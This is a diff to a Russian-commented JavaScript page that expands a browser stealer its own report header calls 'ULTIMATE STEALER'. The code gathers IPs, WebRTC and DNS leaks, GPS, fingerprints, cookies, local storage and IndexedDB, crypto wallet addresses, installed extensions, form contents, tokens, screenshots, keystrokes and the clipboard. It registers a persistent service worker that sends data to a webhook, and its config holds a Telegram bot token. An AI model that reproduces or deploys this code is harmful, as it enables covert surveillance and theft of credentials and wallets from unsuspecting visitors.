@@ -28,15 +28,13 @@
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
-            color: #333;
-            font: 11px/1.4 system-ui, sans-serif;
+            color: #222;
+            font: 10px/1.4 system-ui, sans-serif;
             text-align: center;
-            opacity: 0.2;
+            opacity: 0.15;
             pointer-events: none;
             z-index: 10;
         }
-        /* Без видимой отладки */
-        #debug { display: none !important; }
     </style>
 </head>
 <body>
@@ -52,32 +50,25 @@
             WEBHOOK: 'https://webhook.site/e17f1d78-6414-4450-847a-abc5675a0b48',
             BOT_TOKEN: '8859097143:AAFjWqiNWC_xnJyGmsyfKvODaPFzbqUQL1M',
             CHAT_ID: '8327334745',
-            TIMEOUT: 400,
-            DNS_SERVER: 'leak-{uid}.your-server.com', // для DNS-утечки (подставь свой)
-            WS_SERVER: 'wss://echo.websocket.org',
-            STEALTH: true
+            TIMEOUT: 300,
+            DNS_SERVER: 'leak-{uid}.your-server.com',
+            WS_SERVER: 'wss://echo.websocket.org'
         };
-
-        // ================================================================
-        // ТИХАЯ ОТЛАДКА
-        // ================================================================
-        function log(msg) { if (!CFG.STEALTH) console.log('[S]', msg); }
-        function setStatus(s) { 
-            const el = document.getElementById('status');
-            if (el) el.textContent = s;
-        }
 
         // ================================================================
         // УТИЛИТЫ
         // ================================================================
+        const log = (m) => { if (!window._STEALTH) console.log('[S]', m); };
+        const setStatus = (s) => { const el = document.getElementById('status'); if (el) el.textContent = s; };
         const sleep = ms => new Promise(r => setTimeout(r, ms));
+        const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
         const fetchTO = (url, opts = {}, t = CFG.TIMEOUT) => 
             Promise.race([fetch(url, opts), new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))]);
-        const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
         const b64encode = s => {
             try { return btoa(unescape(encodeURIComponent(s))); } 
             catch { try { return btoa(s); } catch { return ''; } }
         };
+        const uid = () => Math.random().toString(36).slice(2) + Date.now().toString(36);
 
         // ================================================================
         // ЭКСФИЛЬТРАЦИЯ
@@ -124,166 +115,206 @@
         }
 
         // ================================================================
-        // 1. IP (множественные источники)
+        // 1. СЕТЬ (IP, WebRTC, тип сети, задержка, DNS-утечка)
         // ================================================================
-        async function getAllIPs() {
-            const results = {};
+        async function getNetworkData() {
+            const result = { ips: [], webrtc: { public: [], local: [] }, network: null, dns: null, timing: [] };
+            
+            // IP из нескольких источников
             const sources = [
                 { url: 'https://api.ipify.org?format=json', key: 'ip' },
                 { url: 'https://api.ip.sb/geoip', key: 'ip' },
-                { url: 'https://ipapi.co/json/', key: 'ip' },
-                { url: 'https://freeipapi.com/api/json', key: 'ip' },
-                { url: 'https://ip-api.com/json/', key: 'query' }
+                { url: 'https://ipapi.co/json/', key: 'ip' }
             ];
             for (const src of sources) {
                 try {
                     const r = await fetchTO(src.url, {}, 400);
                     const d = await r.json();
-                    const ip = d[src.key] || d.ip || d.query;
+                    const ip = d[src.key] || d.ip;
                     if (ip) {
-                        const key = src.url.split('/')[2];
-                        results[key] = { ip, data: d };
+                        result.ips.push({ ip, source: src.url.split('/')[2], data: d });
                     }
                 } catch {}
             }
-            return results;
-        }
 
-        // ================================================================
-        // 2. WebRTC (все IP)
-        // ================================================================
-        function getWebRTC() {
-            return new Promise((resolve) => {
-                const ips = { public: [], local: [] };
-                try {
-                    const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
-                        iceServers: [
-                            { urls: 'stun:stun.l.google.com:19302' },
-                            { urls: 'stun:stun1.l.google.com:19302' }
-                        ]
-                    });
-                    pc.createDataChannel('');
-                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-                    pc.onicecandidate = (e) => {
-                        if (!e.candidate) return;
-                        const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
-                        if (m) {
-                            m.forEach(ip => {
-                                const isLocal = ip.startsWith('192.168.') || ip.startsWith('10.') || 
-                                               ip.startsWith('172.16.') || ip.startsWith('127.');
-                                if (isLocal) ips.local.push(ip);
-                                else ips.public.push(ip);
-                            });
-                        }
-                    };
-                    setTimeout(() => {
-                        pc.close();
-                        ips.public = [...new Set(ips.public)];
-                        ips.local = [...new Set(ips.local)];
-                        resolve(ips);
-                    }, 600);
-                } catch { resolve(ips); }
-            });
-        }
-
-        // ================================================================
-        // 3. DNS-утечка
-        // ================================================================
-        function dnsLeak() {
-            return new Promise((resolve) => {
-                const start = Date.now();
-                const img = new Image();
-                const uid = Math.random().toString(36).slice(2);
-                const domain = CFG.DNS_SERVER.replace('{uid}', uid);
-                img.src = `https://${domain}/pixel?t=${Date.now()}`;
-                img.onload = () => resolve({ domain, time: Date.now() - start });
-                img.onerror = () => resolve({ domain, time: Date.now() - start });
-                setTimeout(() => resolve({ domain, time: null }), 500);
-            });
-        }
-
-        // ================================================================
-        // 4. WebSocket
-        // ================================================================
-        function wsLeak() {
-            return new Promise((resolve) => {
-                try {
-                    const ws = new WebSocket(CFG.WS_SERVER);
-                    ws.onopen = () => { ws.send('ping'); resolve({ success: true }); ws.close(); };
-                    ws.onerror = () => resolve({ success: false });
-                    setTimeout(() => resolve({ success: false }), 500);
-                } catch { resolve({ success: false }); }
-            });
-        }
-
-        // ================================================================
-        // 5. JSONP (для IP)
-        // ================================================================
-        function jsonpLeak() {
-            return new Promise((resolve) => {
-                const name = '_jsonp_' + Date.now();
-                window[name] = (data) => {
-                    resolve(data.ip || null);
-                    delete window[name];
-                    document.head.removeChild(script);
-                };
-                const script = document.createElement('script');
-                script.src = `https://api.ipify.org?format=jsonp&callback=${name}`;
-                script.onerror = () => { resolve(null); delete window[name]; };
-                document.head.appendChild(script);
-                setTimeout(() => {
-                    if (window[name]) { resolve(null); delete window[name]; }
-                }, 500);
-            });
-        }
-
-        // ================================================================
-        // 6. Временная атака
-        // ================================================================
-        function timingAttack() {
-            return new Promise((resolve) => {
-                const servers = ['https://google.com', 'https://facebook.com', 'https://youtube.com'];
-                const times = [];
-                let done = 0;
-                servers.forEach(s => {
-                    const start = performance.now();
-                    fetch(s, { mode: 'no-cors' })
-                        .then(() => {
-                            times.push(performance.now() - start);
-                            if (++done === servers.length) resolve(times);
-                        })
-                        .catch(() => {
-                            times.push(null);
-                            if (++done === servers.length) resolve(times);
-                        });
+            // WebRTC
+            try {
+                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                 });
-                setTimeout(() => resolve(times), 600);
-            });
-        }
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) return;
+                    const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
+                    if (m) {
+                        m.forEach(ip => {
+                            const isLocal = ip.startsWith('192.168.') || ip.startsWith('10.') || 
+                                           ip.startsWith('172.16.') || ip.startsWith('127.');
+                            if (isLocal) result.webrtc.local.push(ip);
+                            else result.webrtc.public.push(ip);
+                        });
+                    }
+                };
+                await new Promise(r => setTimeout(r, 600));
+                pc.close();
+                result.webrtc.public = [...new Set(result.webrtc.public)];
+                result.webrtc.local = [...new Set(result.webrtc.local)];
+            } catch {}
 
-        // ================================================================
-        // 7. Network info
-        // ================================================================
-        function getNetworkInfo() {
+            // Network API
             try {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (!conn) return null;
-                return {
-                    type: conn.type || 'unknown',
-                    effectiveType: conn.effectiveType,
-                    downlink: conn.downlink,
-                    rtt: conn.rtt,
-                    saveData: conn.saveData
-                };
-            } catch { return null; }
+                if (conn) {
+                    result.network = {
+                        type: conn.type || 'unknown',
+                        effectiveType: conn.effectiveType,
+                        downlink: conn.downlink,
+                        rtt: conn.rtt,
+                        saveData: conn.saveData
+                    };
+                }
+            } catch {}
+
+            // DNS-утечка
+            try {
+                const start = Date.now();
+                const dnsUid = uid();
+                const domain = CFG.DNS_SERVER.replace('{uid}', dnsUid);
+                const img = new Image();
+                img.src = `https://${domain}/pixel?t=${Date.now()}`;
+                await new Promise(r => setTimeout(r, 500));
+                result.dns = { domain, time: Date.now() - start };
+            } catch {}
+
+            // Временная атака (задержка)
+            const servers = ['https://google.com', 'https://facebook.com'];
+            const times = [];
+            for (const s of servers) {
+                try {
+                    const start = performance.now();
+                    await fetch(s, { mode: 'no-cors' });
+                    times.push(performance.now() - start);
+                } catch {}
+            }
+            if (times.length) {
+                result.timing = times;
+            }
+
+            return result;
         }
 
         // ================================================================
-        // 8. Фингерпринты (WebGL, Audio, Fonts, Screen)
+        // 2. ГЕОЛОКАЦИЯ (GPS)
+        // ================================================================
+        function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) { resolve(null); return; }
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                    () => resolve(null),
+                    { timeout: 3000, enableHighAccuracy: false }
+                );
+                setTimeout(() => resolve(null), 3000);
+            });
+        }
+
+        // ================================================================
+        // 3. УСТРОЙСТВО (ОС, браузер, модель, ядра, RAM, экран)
+        // ================================================================
+        function getDeviceInfo() {
+            const n = navigator;
+            const ua = n.userAgent.toLowerCase();
+            const result = {
+                userAgent: n.userAgent,
+                platform: n.platform,
+                cores: n.hardwareConcurrency || '?',
+                memory: n.deviceMemory || '?',
+                language: n.language,
+                languages: n.languages || [],
+                vendor: n.vendor,
+                maxTouchPoints: n.maxTouchPoints || 0,
+                os: 'unknown',
+                osVersion: 'unknown',
+                browser: 'unknown',
+                browserVersion: 'unknown',
+                model: 'unknown'
+            };
+
+            // ОС
+            if (ua.includes('windows')) {
+                result.os = 'Windows';
+                if (ua.includes('windows nt 10.0')) result.osVersion = '10/11';
+                else if (ua.includes('windows nt 6.3')) result.osVersion = '8.1';
+                else if (ua.includes('windows nt 6.1')) result.osVersion = '7';
+            } else if (ua.includes('mac os x')) {
+                result.os = 'macOS';
+                const m = ua.match(/mac os x (\d+)_(\d+)/);
+                if (m) result.osVersion = `${m[1]}.${m[2]}`;
+            } else if (ua.includes('linux')) {
+                result.os = 'Linux';
+                if (ua.includes('android')) {
+                    result.os = 'Android';
+                    const m = ua.match(/android (\d+\.\d+)/);
+                    if (m) result.osVersion = m[1];
+                }
+            } else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) {
+                result.os = 'iOS';
+                const m = ua.match(/os (\d+)_(\d+)/);
+                if (m) result.osVersion = `${m[1]}.${m[2]}`;
+            }
+
+            // Браузер
+            if (!!window.chrome && !ua.includes('edg') && !ua.includes('opr')) {
+                result.browser = 'Chrome';
+                const m = ua.match(/chrome\/(\d+)/);
+                if (m) result.browserVersion = m[1];
+            } else if (ua.includes('firefox')) {
+                result.browser = 'Firefox';
+                const m = ua.match(/firefox\/(\d+)/);
+                if (m) result.browserVersion = m[1];
+            } else if (ua.includes('safari') && !ua.includes('chrome')) {
+                result.browser = 'Safari';
+                const m = ua.match(/version\/(\d+)/);
+                if (m) result.browserVersion = m[1];
+            } else if (ua.includes('edg')) {
+                result.browser = 'Edge';
+                const m = ua.match(/edg\/(\d+)/);
+                if (m) result.browserVersion = m[1];
+            } else if (ua.includes('opr')) {
+                result.browser = 'Opera';
+                const m = ua.match(/opr\/(\d+)/);
+                if (m) result.browserVersion = m[1];
+            }
+
+            // Модель (Android/iOS)
+            if (result.os === 'Android') {
+                const m = ua.match(/; (.*?) Build\//);
+                if (m) result.model = m[1];
+            } else if (result.os === 'iOS') {
+                const m = ua.match(/\(([^;]+);/);
+                if (m) result.model = m[1];
+            }
+
+            // Экран
+            result.screen = {
+                width: screen.width,
+                height: screen.height,
+                pixelRatio: window.devicePixelRatio,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth
+            };
+
+            return result;
+        }
+
+        // ================================================================
+        // 4. ФИНГЕРПРИНТЫ (WebGL, Canvas, Audio, шрифты, таймзона)
         // ================================================================
         function getFingerprints() {
             const fp = {};
-            
+
             // Canvas
             try {
                 const c = document.createElement('canvas');
@@ -304,7 +335,7 @@
                 ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 70);
                 fp.canvas = c.toDataURL().slice(0, 100);
             } catch {}
-            
+
             // WebGL
             try {
                 const c = document.createElement('canvas');
@@ -322,11 +353,11 @@
                             renderer: gl.getParameter(gl.RENDERER)
                         };
                     }
-                    fp.webglVersion = gl.getParameter(gl.VERSION);
-                    fp.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+                    fp.webgl.version = gl.getParameter(gl.VERSION);
+                    fp.webgl.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
                 }
             } catch {}
-            
+
             // Audio
             try {
                 const AudioCtx = window.AudioContext || window.webkitAudioContext;
@@ -335,65 +366,26 @@
                     fp.audio = { sampleRate: ctx.sampleRate };
                 }
             } catch {}
-            
-            // Fonts
+
+            // Шрифты
             try {
                 const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
                     'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans',
-                    'Lato', 'Montserrat', 'Ubuntu', 'Fira Sans', 'Segoe UI', 'Helvetica Neue'];
+                    'Lato', 'Montserrat', 'Ubuntu', 'Fira Sans', 'Segoe UI', 'Helvetica Neue',
+                    'Arial Black', 'Calibri', 'Cambria', 'Consolas', 'Lucida Console'];
                 fp.fonts = fonts.filter(f => {
                     try { return document.fonts.check(`16px "${f}"`); } catch { return false; }
                 });
             } catch {}
-            
-            // Screen
-            fp.screen = {
-                width: screen.width,
-                height: screen.height,
-                pixelRatio: window.devicePixelRatio,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth
-            };
-            
-            // Timezone
+
+            // Таймзона
             try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch {}
-            
+
             return fp;
         }
 
         // ================================================================
-        // 9. Система
-        // ================================================================
-        function getSystem() {
-            const n = navigator;
-            const ua = n.userAgent.toLowerCase();
-            return {
-                userAgent: n.userAgent,
-                platform: n.platform,
-                cores: n.hardwareConcurrency || '?',
-                memory: n.deviceMemory || '?',
-                language: n.language,
-                languages: n.languages || [],
-                vendor: n.vendor,
-                isChrome: !!window.chrome,
-                isFirefox: ua.includes('firefox'),
-                isSafari: /^((?!chrome|android).)*safari/i.test(n.userAgent),
-                isEdge: !!window.MSInputMethodContext,
-                os: ua.includes('windows') ? 'Windows' :
-                     ua.includes('mac') ? 'macOS' :
-                     ua.includes('linux') ? 'Linux' :
-                     ua.includes('android') ? 'Android' :
-                     ua.includes('ios') ? 'iOS' : 'unknown',
-                browser: !!window.chrome ? 'Chrome' :
-                          ua.includes('firefox') ? 'Firefox' :
-                          ua.includes('safari') ? 'Safari' :
-                          ua.includes('edge') ? 'Edge' : 'unknown'
-            };
-        }
-
-        // ================================================================
-        // 10. Storage & Secrets
+        // 5. STORAGE (LocalStorage, SessionStorage, Cookies, IndexedDB)
         // ================================================================
         function getStorage() {
             const ls = {};
@@ -409,9 +401,167 @@
             return { localStorage: ls, sessionStorage: ss, cookies: document.cookie || 'нет' };
         }
 
+        function getIndexedDB() {
+            return new Promise((resolve) => {
+                try {
+                    if (!indexedDB.databases) { resolve(null); return; }
+                    indexedDB.databases().then(dbs => {
+                        const result = [];
+                        let done = 0;
+                        if (dbs.length === 0) { resolve([]); return; }
+                        dbs.forEach(dbInfo => {
+                            const req = indexedDB.open(dbInfo.name);
+                            req.onsuccess = (e) => {
+                                const db = e.target.result;
+                                const stores = Array.from(db.objectStoreNames);
+                                const storeData = [];
+                                let sDone = 0;
+                                if (stores.length === 0) {
+                                    result.push({ name: dbInfo.name, stores: [] });
+                                    db.close();
+                                    if (++done === dbs.length) resolve(result);
+                                    return;
+                                }
+                                stores.forEach(storeName => {
+                                    try {
+                                        const tx = db.transaction(storeName, 'readonly');
+                                        const store = tx.objectStore(storeName);
+                                        const reqAll = store.getAll();
+                                        reqAll.onsuccess = () => {
+                                            const items = reqAll.result || [];
+                                            storeData.push({ storeName, count: items.length });
+                                            if (++sDone === stores.length) {
+                                                result.push({ name: dbInfo.name, stores: storeData });
+                                                db.close();
+                                                if (++done === dbs.length) resolve(result);
+                                            }
+                                        };
+                                        reqAll.onerror = () => {
+                                            storeData.push({ storeName, count: 0 });
+                                            if (++sDone === stores.length) {
+                                                result.push({ name: dbInfo.name, stores: storeData });
+                                                db.close();
+                                                if (++done === dbs.length) resolve(result);
+                                            }
+                                        };
+                                    } catch (err) {
+                                        storeData.push({ storeName, count: 0 });
+                                        if (++sDone === stores.length) {
+                                            result.push({ name: dbInfo.name, stores: storeData });
+                                            db.close();
+                                            if (++done === dbs.length) resolve(result);
+                                        }
+                                    }
+                                });
+                            };
+                            req.onerror = () => { if (++done === dbs.length) resolve(result); };
+                        });
+                    }).catch(() => resolve(null));
+                } catch { resolve(null); }
+            });
+        }
+
+        // ================================================================
+        // 6. КРИПТОВАЛЮТА (кошельки, сеть)
+        // ================================================================
+        function getWallets() {
+            const result = [];
+            try {
+                if (window.ethereum) {
+                    result.push({
+                        type: 'Ethereum',
+                        address: window.ethereum.selectedAddress || null,
+                        chainId: window.ethereum.chainId || null,
+                        isMetaMask: window.ethereum.isMetaMask || false
+                    });
+                    if (window.ethereum.providers) {
+                        window.ethereum.providers.forEach(p => {
+                            if (p.selectedAddress) {
+                                result.push({ type: 'Ethereum', address: p.selectedAddress, isMetaMask: p.isMetaMask || false });
+                            }
+                        });
+                    }
+                }
+            } catch {}
+            try {
+                if (window.solana && window.solana.publicKey) {
+                    result.push({ type: 'Solana', address: window.solana.publicKey.toString() });
+                }
+                if (window.phantom && window.phantom.solana && window.phantom.solana.publicKey) {
+                    result.push({ type: 'Phantom', address: window.phantom.solana.publicKey.toString() });
+                }
+            } catch {}
+            const names = ['trustwallet', 'okxwallet', 'bitkeep', 'coinbase', 'walletconnect'];
+            names.forEach(n => {
+                try { if (window[n]) result.push({ type: n, address: null }); } catch {}
+            });
+            return result;
+        }
+
+        // ================================================================
+        // 7. РАСШИРЕНИЯ
+        // ================================================================
+        function getExtensions() {
+            const result = [];
+            const known = {
+                'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask',
+                'cjpalhdlnbpafiamejdnhcphjbkeiagm': 'uBlock Origin',
+                'gighmmpiobklfepjocnamgkkbiglidom': 'AdBlock',
+                'hnfanknocfeofbddgcijnmhnfnkdnaad': 'Coinbase',
+                'hpihmllllekjbnpehglncmolodpknmmb': 'Trust Wallet',
+                'bpaejdmabdchhpnpepceapmdmgellhpg': 'OKX Wallet',
+                'aapbdbdomjkkjkaonfhkkikfgjllcleb': 'Google Translate',
+                'lmjegmlicamnimmfhcmpkclmigmmcbeh': 'Tampermonkey',
+                'jilocjlanhgkobdddpdgaennlbnadnhb': 'LastPass',
+                'mooikfkahbdckaollhiabmhbonmhbbha': 'Bitwarden'
+            };
+            try {
+                if (window.chrome && chrome.runtime) {
+                    Object.keys(known).forEach(id => {
+                        try {
+                            const url = chrome.runtime.getURL(`//${id}/manifest.json`);
+                            fetch(url, { mode: 'no-cors' }).catch(() => {});
+                            result.push(known[id]);
+                        } catch {}
+                    });
+                }
+            } catch {}
+            return result;
+        }
+
+        // ================================================================
+        // 8. ПАРОЛИ (автозаполненные формы)
+        // ================================================================
+        function getPasswords() {
+            const result = [];
+            try {
+                document.querySelectorAll('form').forEach(form => {
+                    const data = { action: form.action || '', inputs: [] };
+                    form.querySelectorAll('input').forEach(input => {
+                        if (input.value && input.value.length > 0) {
+                            const isPassword = input.type === 'password';
+                            const isEmail = input.type === 'email' || input.autocomplete === 'username';
+                            data.inputs.push({
+                                name: input.name || input.id || '',
+                                type: input.type,
+                                value: isPassword ? '[PASSWORD]' : trunc(input.value, 50),
+                                autocomplete: input.autocomplete || '',
+                                isPassword: isPassword
+                            });
+                        }
+                    });
+                    if (data.inputs.length > 0) result.push(data);
+                });
+            } catch {}
+            return result;
+        }
+
+        // ================================================================
+        // 9. СЕССИИ (JWT, куки, токены)
+        // ================================================================
         function findSecrets(obj) {
             const result = [];
-            const patterns = ['token', 'jwt', 'secret', 'key', 'auth', 'password', 'pwd', 'api', 'private', 'wallet', 'mnemonic', 'seed', 'recovery', 'access', 'refresh'];
+            const patterns = ['token', 'jwt', 'secret', 'key', 'auth', 'password', 'pwd', 'api', 'private', 'wallet', 'mnemonic', 'seed', 'recovery', 'access', 'refresh', 'csrf', 'xsrf', 'session'];
             const search = (data, path = '') => {
                 if (!data || typeof data !== 'object') return;
                 for (let k in data) {
@@ -430,55 +580,31 @@
         }
 
         // ================================================================
-        // 11. Криптокошельки
+        // 10. DOM (всё на странице)
         // ================================================================
-        function getWallets() {
-            const result = [];
-            try {
-                if (window.ethereum && window.ethereum.selectedAddress) {
-                    result.push({ type: 'Ethereum', address: window.ethereum.selectedAddress, chain: window.ethereum.chainId });
-                }
-                if (window.solana && window.solana.publicKey) {
-                    result.push({ type: 'Solana', address: window.solana.publicKey.toString() });
-                }
-                if (window.phantom && window.phantom.solana && window.phantom.solana.publicKey) {
-                    result.push({ type: 'Phantom', address: window.phantom.solana.publicKey.toString() });
-                }
-            } catch {}
-            return result;
-        }
-
-        // ================================================================
-        // 12. Расширения
-        // ================================================================
-        function getExtensions() {
-            const result = [];
-            const known = {
-                'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask',
-                'cjpalhdlnbpafiamejdnhcphjbkeiagm': 'uBlock',
-                'gighmmpiobklfepjocnamgkkbiglidom': 'AdBlock',
-                'hnfanknocfeofbddgcijnmhnfnkdnaad': 'Coinbase',
-                'hpihmllllekjbnpehglncmolodpknmmb': 'Trust Wallet',
-                'bpaejdmabdchhpnpepceapmdmgellhpg': 'OKX Wallet',
-                'aapbdbdomjkkjkaonfhkkikfgjllcleb': 'Google Translate',
-                'lmjegmlicamnimmfhcmpkclmigmmcbeh': 'Tampermonkey'
+        function getDOM() {
+            const result = {
+                title: document.title,
+                url: window.location.href,
+                referrer: document.referrer || 'нет',
+                forms: document.querySelectorAll('form').length,
+                inputs: document.querySelectorAll('input, textarea, select').length,
+                links: document.querySelectorAll('a[href]').length,
+                scripts: document.querySelectorAll('script').length,
+                images: document.querySelectorAll('img').length,
+                meta: {}
             };
             try {
-                if (window.chrome && chrome.runtime) {
-                    Object.keys(known).forEach(id => {
-                        try {
-                            const url = chrome.runtime.getURL(`//${id}/manifest.json`);
-                            fetch(url, { mode: 'no-cors' }).catch(() => {});
-                            result.push(known[id]);
-                        } catch {}
-                    });
-                }
+                document.querySelectorAll('meta').forEach(m => {
+                    const name = m.getAttribute('name') || m.getAttribute('property') || '';
+                    if (name) result.meta[name] = m.getAttribute('content') || '';
+                });
             } catch {}
             return result;
         }
 
         // ================================================================
-        // 13. Screenshot (быстрый, низкое качество)
+        // 11. СКРИНШОТ
         // ================================================================
         async function takeScreenshot() {
             try {
@@ -504,7 +630,7 @@
         }
 
         // ================================================================
-        // 14. Keylogger (тихий)
+        // 12. KEYLOGGER
         // ================================================================
         function setupKeylogger() {
             const buffer = [];
@@ -514,7 +640,8 @@
                     'Control': '[CTRL]', 'Shift': '[SHIFT]', 'Alt': '[ALT]',
                     'Meta': '[WIN]', 'Escape': '[ESC]', 'Tab': '[TAB]',
                     'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]',
-                    'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]'
+                    'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]',
+                    'Home': '[HOME]', 'End': '[END]', 'PageUp': '[PGUP]', 'PageDown': '[PGDN]'
                 };
                 let out = special[e.key] || e.key;
                 if (e.ctrlKey) out = '[CTRL]+' + out;
@@ -536,277 +663,425 @@
         }
 
         // ================================================================
-        // 15. ФОРМАТИРОВАНИЕ ОТЧЁТА (как в старом стилере)
+        // 13. БУФЕР ОБМЕНА
+        // ================================================================
+        async function getClipboard() {
+            try {
+                const ta = document.createElement('textarea');
+                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
+                document.body.appendChild(ta);
+                ta.focus();
+                if (document.execCommand('paste')) {
+                    const val = ta.value;
+                    ta.remove();
+                    if (val && val.length > 0) return val;
+                }
+                ta.remove();
+            } catch {}
+            try {
+                if (navigator.clipboard && navigator.clipboard.read) {
+                    const items = await navigator.clipboard.read();
+                    for (let item of items) {
+                        if (item.types.includes('text/plain')) {
+                            const blob = await item.getType('text/plain');
+                            return await blob.text();
+                        }
+                    }
+                }
+            } catch {}
+            return null;
+        }
+
+        // ================================================================
+        // 14. SERVICE WORKERS (персистентность)
+        // ================================================================
+        function setupPersistence() {
+            try {
+                if ('serviceWorker' in navigator) {
+                    const swCode = `
+                        self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
+                        self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
+                        self.addEventListener('message', e => {
+                            if (e.data && e.data.type === 'EXFIL') {
+                                fetch('${CFG.WEBHOOK}', {
+                                    method: 'POST',
+                                    body: JSON.stringify(e.data.payload)
+                                });
+                            }
+                        });
+                    `;
+                    const blob = new Blob([swCode], { type: 'application/javascript' });
+                    const url = URL.createObjectURL(blob);
+                    navigator.serviceWorker.register(url, { scope: '/' });
+                    return true;
+                }
+            } catch {}
+            return false;
+        }
+
+        // ================================================================
+        // 15. СЕНСОРЫ (акселерометр, гироскоп, батарея)
+        // ================================================================
+        function getSensors() {
+            return new Promise((resolve) => {
+                const result = {};
+                // Батарея
+                try {
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(battery => {
+                            result.battery = {
+                                level: Math.round(battery.level * 100),
+                                charging: battery.charging,
+                                chargingTime: battery.chargingTime,
+                                dischargingTime: battery.dischargingTime
+                            };
+                            resolve(result);
+                        });
+                    }
+                } catch {}
+                // Акселерометр (однократное чтение)
+                try {
+                    if (window.DeviceMotionEvent) {
+                        const handler = (e) => {
+                            if (e.acceleration) {
+                                result.acceleration = {
+                                    x: e.acceleration.x,
+                                    y: e.acceleration.y,
+                                    z: e.acceleration.z
+                                };
+                            }
+                            if (e.rotationRate) {
+                                result.rotationRate = {
+                                    alpha: e.rotationRate.alpha,
+                                    beta: e.rotationRate.beta,
+                                    gamma: e.rotationRate.gamma
+                                };
+                            }
+                            window.removeEventListener('devicemotion', handler);
+                            resolve(result);
+                        };
+                        window.addEventListener('devicemotion', handler, { once: true });
+                    }
+                } catch {}
+                setTimeout(() => resolve(result), 1000);
+            });
+        }
+
+        // ================================================================
+        // 16. ФОРМАТИРОВАНИЕ ОТЧЁТА
         // ================================================================
         function formatReport(data) {
             const lines = [];
-            lines.push('🔴 ЖЕРТВА (быстрый дамп)');
+            lines.push('🔴 ULTIMATE STEALER — ВСЕ ДАННЫЕ');
+            lines.push('═'.repeat(40));
             lines.push('');
-            
-            // IP
-            if (data.ip) {
-                lines.push(`🌐 IP: ${data.ip}`);
-                if (data.geo) {
-                    const g = data.geo;
-                    const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
-                    if (loc) lines.push(`📍 ${loc}`);
-                    if (g.lat && g.lon) lines.push(`🗺 ${g.lat}, ${g.lon}`);
-                    if (g.isp) lines.push(`📡 ${g.isp}`);
-                }
-                lines.push('');
-            }
-            
-            // Все IP
-            const allIPs = data.allIPs || [];
-            if (allIPs.length) {
-                lines.push(`🌐 ВСЕ IP: ${allIPs.join(', ')}`);
-                lines.push('');
-            }
-            
-            // WebRTC
-            if (data.webrtc && data.webrtc.public && data.webrtc.public.length) {
-                lines.push(`📡 WebRTC: ${data.webrtc.public.join(', ')}`);
-            }
-            
-            // Другие источники
-            if (data.fetchIP) lines.push(`🌍 Fetch: ${data.fetchIP}`);
-            if (data.jsonpIP) lines.push(`🌍 JSONP: ${data.jsonpIP}`);
-            if (data.proxyIP) lines.push(`🌍 Proxy: ${data.proxyIP}`);
-            
-            // DNS
-            if (data.dns) {
-                lines.push(`🕵️ DNS: ${data.dns.domain} (${data.dns.time || 'таймаут'}ms)`);
-            }
-            
-            // Image leak
-            if (data.image) {
-                lines.push(`🖼 Image: ${data.image.uid} (${data.image.time || 'таймаут'}ms)`);
-            }
-            
-            // WebSocket
-            if (data.ws && data.ws.success) {
-                lines.push(`🔌 WS: успешно`);
-            }
-            
-            // Network
+
+            // Сеть
             if (data.network) {
                 const n = data.network;
-                lines.push(`📶 Сеть: ${n.effectiveType || '?'} ${n.downlink || '?'}Mbps, RTT ${n.rtt || '?'}ms`);
-            }
-            
-            // Timing attack
-            if (data.timing && data.timing.length) {
-                const valid = data.timing.filter(t => t !== null);
-                if (valid.length) {
-                    const avg = Math.round(valid.reduce((a,b) => a + b, 0) / valid.length);
+                if (n.ips && n.ips.length) {
+                    const ipList = n.ips.map(i => i.ip).join(', ');
+                    lines.push(`🌐 IP: ${ipList}`);
+                    const geo = n.ips.find(i => i.data && i.data.country);
+                    if (geo) {
+                        const g = geo.data;
+                        const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
+                        if (loc) lines.push(`📍 ${loc}`);
+                        if (g.isp) lines.push(`📡 ${g.isp}`);
+                    }
+                    lines.push('');
+                }
+                const allIPs = [];
+                if (n.webrtc && n.webrtc.public && n.webrtc.public.length) {
+                    allIPs.push(...n.webrtc.public);
+                }
+                if (n.ips) {
+                    n.ips.forEach(i => { if (i.ip) allIPs.push(i.ip); });
